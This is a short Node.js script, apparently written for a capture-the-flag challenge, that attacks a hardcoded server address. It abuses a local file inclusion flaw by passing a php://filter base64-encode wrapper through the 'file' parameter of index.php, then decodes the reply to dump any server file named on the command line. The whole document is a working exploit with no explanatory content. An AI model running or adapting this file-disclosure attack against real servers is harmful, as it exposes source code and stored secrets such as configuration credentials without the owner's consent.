const got = require('got')

const HOST = 'http://120.55.43.255:24719'

const getBody = (response) => response.body.split('\n')[3].replace(/<\/html>\r$/, '').trim()

const source = async (filename) => {
  let response = await got(`${HOST}/index.php`, {
    searchParams: {
      file: `php://filter/read=convert.base64-encode/resource=${filename}`,
    },
  })
  return Buffer.from(getBody(response), 'base64').toString()
}

;(async () => {
  let filename = process.argv.slice(2)[0] || 'index.php'
  console.log(await source(filename))
})()
